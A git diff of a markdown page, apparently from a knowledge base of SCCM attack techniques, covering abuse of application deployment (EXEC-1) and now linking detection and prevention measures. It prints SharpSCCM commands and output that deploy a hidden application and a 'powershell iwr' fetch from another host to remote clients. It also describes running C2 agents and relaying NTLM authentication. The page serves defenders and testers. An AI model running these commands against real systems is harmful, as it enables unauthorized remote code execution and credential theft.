@@ -1,4 +1,5 @@
 # EXEC-1
+
 ## Description
 Application deployment
 
@@ -15,16 +16,18 @@ Permitted security roles:
 SCCM allows administrators to deploy applications located at a specified UNC path to client devices and can select whether they are executed as `SYSTEM`, as the currently logged in user, or as a specific user.
 
 ## Impact
-An attacker could use this technique to deploy an application on a remote client device as `SYSTEM`, as the currently logged in user, or as a specific user. This can be abused to conduct lateral movement by executing a C2 agent binary from a reachable UNC path (e.g., a readable file share) or by specifying the UNC path of an attacker relay server.
+An attacker could use this technique to deploy an application on a remote client device as `SYSTEM`, as the currently logged in user, or as a specific user. This can be abused to conduct lateral movement by executing a C2 agent binary from a reachable UNC path (e.g., a readable file share) or by specifying the UNC path of an attacker relay server and forwarding the user's NTLM authentication to another system where they have administrator privileges.
 
 New applications can also be hidden from being displayed in the Configuration Manager Console software, making them more difficult to detect.
+
+## Defensive IDs
+- [DETECT-4: Monitor application deployment logs in the site's Audit Status Messages](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)
+- [PREVENT-9: Enforce MFA for SMS Provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)
+- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
 
 ## Subtechniques
 - EXEC-1.1 - Deploy binary or script from share
 - EXEC-1.2 - Deploy as user to relay NTLM authentication
-
-## Defensive IDs
-- 
 
 ## Examples
 
@@ -52,101 +55,101 @@ Note that any user with the `Application Administrator` role can also perform th
 
 2. Execute the following command, which creates a device collection, adds the specified device or user to the collection, creates an application using the specified installation path, deploys the application to the device collection, waits for the deployment to complete (the default is 5 minutes but may need to be increased in large hierarchies), then cleans up the created objects:
 
-```
-SharpSCCM.exe exec -p calc.exe -d CLIENT -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner
+    ```
+    SharpSCCM.exe exec -p calc.exe -d CLIENT -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner
 
-[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
-[+] Creating new device collection: Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
-[+] Successfully created collection
-[+] Found resource named CLIENT with ResourceID 16777219
-[+] Added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
-[+] Waiting for new collection member to become available...
-[+] New collection member is not available yet... trying again in 5 seconds
-[+] Successfully added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
-[+] Creating new application: Application_f8250c0c-efc9-4111-80e7-0518db02978a
-[+] Application path: calc.exe
-[+] Updated application to hide it from the Configuration Manager console
-[+] Updated application to run in the context of the logged on user
-[+] Successfully created application
-[+] Creating new deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
-[+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
-[+] Successfully created deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
-[+] New deployment name: Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
-[+] Waiting for new deployment to become available...
-[+] New deployment is available, waiting 30 seconds for updated policy to become available
-[+] Forcing all members of Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042) to retrieve machine policy and execute any new applications available
-[+] Waiting 300 seconds for execution to complete...
-[+] Cleaning up
-[+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
-[+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
-[+] Querying for deployments of Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
-[+] No remaining deployments named Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install were found
-[+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
-[+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
-[+] Querying for applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a
-[+] No remaining applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a were found
-[+] Deleted the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
-[+] Querying for the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
-[+] Found 0 collections matching the specified CollectionID
-[+] No remaining collections named Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c with CollectionID PS100042 were found
-[+] Completed execution in 00:06:20.5442081
-```
+    [+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
+    [+] Creating new device collection: Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
+    [+] Successfully created collection
+    [+] Found resource named CLIENT with ResourceID 16777219
+    [+] Added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
+    [+] Waiting for new collection member to become available...
+    [+] New collection member is not available yet... trying again in 5 seconds
+    [+] Successfully added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
+    [+] Creating new application: Application_f8250c0c-efc9-4111-80e7-0518db02978a
+    [+] Application path: calc.exe
+    [+] Updated application to hide it from the Configuration Manager console
+    [+] Updated application to run in the context of the logged on user
+    [+] Successfully created application
+    [+] Creating new deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
+    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
+    [+] Successfully created deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
+    [+] New deployment name: Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
+    [+] Waiting for new deployment to become available...
+    [+] New deployment is available, waiting 30 seconds for updated policy to become available
+    [+] Forcing all members of Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042) to retrieve machine policy and execute any new applications available
+    [+] Waiting 300 seconds for execution to complete...
+    [+] Cleaning up
+    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
+    [+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
+    [+] Querying for deployments of Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
+    [+] No remaining deployments named Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install were found
+    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
+    [+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
+    [+] Querying for applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a
+    [+] No remaining applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a were found
+    [+] Deleted the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
+    [+] Querying for the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
+    [+] Found 0 collections matching the specified CollectionID
+    [+] No remaining collections named Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c with CollectionID PS100042 were found
+    [+] Completed execution in 00:06:20.5442081
+    ```
 
-Note that by default, the application is executed in the context of the currently logged on user, but can be executed as `SYSTEM` using the `-s` option.
+    Note that by default, the application is executed in the context of the currently logged on user, but can be executed as `SYSTEM` using the `-s` option.
 
-The path (`calc.exe`) can be substituted for a UNC path where a binary resides (e.g., a C2 agent binary on a readable file share, `\\share\bin.exe`). 
+    The path (`calc.exe`) can be substituted for a UNC path where a binary resides (e.g., a C2 agent binary on a readable file share, `\\share\bin.exe`). 
 
-Alternatively, the installation path can be set to the path for PowerShell to execute a script in on the device.
+    Alternatively, the installation path can be set to the path for PowerShell to execute a script in on the device.
 
-```
-SharpSCCM.exe exec -d <DEVICE> -p "powershell iwr http://192.168.57.131"
+    ```
+    SharpSCCM.exe exec -d <DEVICE> -p "powershell iwr http://192.168.57.131"
 
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |
+    _______ _     _ _______  ______  _____  _______ _______ _______ _______
+    |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
+    ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |
 
-[+] Querying the local WMI repository for the current management point and site code
-[+] Connecting to \\127.0.0.1\root\CCM
-[+] Current management point: ATLAS.APERTURE.SCI
-[+] Site code: PS1
-[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
-[+] Found 0 collections matching the specified
-[+] Creating new device collection: Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
-[+] Successfully created collection
-[+] Found resource named <DEVICE> with ResourceID 16777281
-[+] Added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
-[+] Waiting for new collection member to become available...
-[+] New collection member is not available yet... trying again in 5 seconds
-[+] Successfully added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
-[+] Creating new application: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
-[+] Application path: powershell iwr http://192.168.57.131
-[+] Updated application to run in the context of the logged on user
-[+] Successfully created application
-[+] Creating new deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
-[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
-[+] Successfully created deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
-[+] New deployment name: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
-[+] Waiting for new deployment to become available...
-[+] New deployment is available, waiting 30 seconds for updated policy to become available
-[+] Forcing all members of Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061) to retrieve machine policy and execute any new applications available
-[+] Waiting 1 minute for execution to complete...
-[+] Cleaning up
-[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
-[+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
-[+] Querying for deployments of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
-[+] No remaining deployments named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install were found
-[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
-[+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
-[+] Querying for applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
-[+] No remaining applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a were found
-[+] Deleted the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
-[+] Querying for the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
-[+] Found 0 collections matching the specified CollectionID
-[+] No remaining collections named Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 with CollectionID PS100061 were found
-[+] Completed execution in 00:01:54.5997840
-```
+    [+] Querying the local WMI repository for the current management point and site code
+    [+] Connecting to \\127.0.0.1\root\CCM
+    [+] Current management point: ATLAS.APERTURE.SCI
+    [+] Site code: PS1
+    [+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
+    [+] Found 0 collections matching the specified
+    [+] Creating new device collection: Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
+    [+] Successfully created collection
+    [+] Found resource named <DEVICE> with ResourceID 16777281
+    [+] Added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
+    [+] Waiting for new collection member to become available...
+    [+] New collection member is not available yet... trying again in 5 seconds
+    [+] Successfully added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
+    [+] Creating new application: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
+    [+] Application path: powershell iwr http://192.168.57.131
+    [+] Updated application to run in the context of the logged on user
+    [+] Successfully created application
+    [+] Creating new deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
+    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
+    [+] Successfully created deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
+    [+] New deployment name: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
+    [+] Waiting for new deployment to become available...
+    [+] New deployment is available, waiting 30 seconds for updated policy to become available
+    [+] Forcing all members of Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061) to retrieve machine policy and execute any new applications available
+    [+] Waiting 1 minute for execution to complete...
+    [+] Cleaning up
+    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
+    [+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
+    [+] Querying for deployments of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
+    [+] No remaining deployments named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install were found
+    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
+    [+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
+    [+] Querying for applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
+    [+] No remaining applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a were found
+    [+] Deleted the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
+    [+] Querying for the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
+    [+] Found 0 collections matching the specified CollectionID
+    [+] No remaining collections named Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 with CollectionID PS100061 were found
+    [+] Completed execution in 00:01:54.5997840
+    ```
 
-Installation paths can include other programs and their arguments as well, so there are many possible ways to abuse this functionality.
+    Installation paths can include other programs and their arguments as well, so there are many possible ways to abuse this functionality.
 
 ### EXEC-1.2
 This technique to elicit NTLM authentication is no different than application deployment via EXEC-1.1, except that the installation path of outher malicious application is set to a UNC path on a relay server that the attacker controls. That way, when each SCCM client in the deployment group attempts to install the new application, it sends NTLM authentication to the attacker's listening machine via SMB (or HTTP, if WebClient is enabled). This is advantageous in scenarios where execution of PowerShell or a C2 agent binary is blocked or could result in detection. 
@@ -324,7 +327,7 @@ Because SCCM has an option to install application deployments either as the logg
     ```
 
 ## References
-- Matt Nelson, Offensive Operations with PowerSCCM, https://enigma0x3.net/2016/02/29/offensive-operations-with-powersccm/
-- Dave Kennedy and Dave DeSimone, Owning One to Rule Them All, https://vimeo.com/47978442
-- Chris Thompson, Relaying NTLM Authentication from SCCM Clients, https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867
-- Chris Thompson, SharpSCCM, https://github.com/Mayyhem/SharpSCCM/wiki/exec
+- Matt Nelson, [Offensive Operations with PowerSCCM](https://enigma0x3.net/2016/02/29/offensive-operations-with-powersccm/)
+- Dave Kennedy and Dave DeSimone, [Owning One to Rule Them All](https://vimeo.com/47978442)
+- Chris Thompson, [Relaying NTLM Authentication from SCCM Clients](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
+- Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM/wiki/exec)
